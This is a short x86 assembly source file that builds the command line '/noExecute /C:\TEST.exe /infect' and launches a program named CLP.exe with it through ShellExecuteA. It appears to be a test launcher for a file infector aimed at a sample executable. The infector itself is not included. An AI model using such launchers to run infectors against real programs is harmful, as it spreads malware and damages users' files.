
                .386p
                .model flat

        extrn   ExitProcess      :proc
        extrn   GetDesktopWindow :proc
        extrn   ShellExecuteA    :proc

                .data

        sz_EXE          db      'CLP.exe',0
        sz_NULL         db      '',0
        sz_noExecute    db      '/noExecute',0
        sz_Path         db      '/C:\TEST.exe',0
        sz_Action       db      '/infect',0
        sz_Params       db      260 dup (?)

                .code

SET:    lea     esi, sz_noExecute
        lea     edi, sz_Params

loop01: mov     al, [esi]
        cmp     al, 00h
        je      end_loop01
        mov     [edi], al
        inc     esi
        inc     edi
        jmp     loop01
end_loop01:

        mov     byte ptr [edi], 20h
        inc     edi
        lea     esi, sz_Path

loop02: mov     al, [esi]
        cmp     al, 00h
        je      end_loop02
        mov     [edi], al
        inc     esi
        inc     edi
        jmp     loop02
end_loop02:

        mov     byte ptr [edi], 20h
        inc     edi
        lea     esi, sz_Action

loop03: mov     al, [esi]
        cmp     al, 00h
        je      end_loop03
        mov     [edi], al
        inc     esi
        inc     edi
        jmp     loop03
end_loop03:

        mov     byte ptr [edi], 00h

        push    05h offset sz_NULL offset sz_Params offset sz_EXE 00h
        call    GetDesktopWindow
        push    eax
        call    ShellExecuteA

        push    00h
        call    ExitProcess

end     SET
end
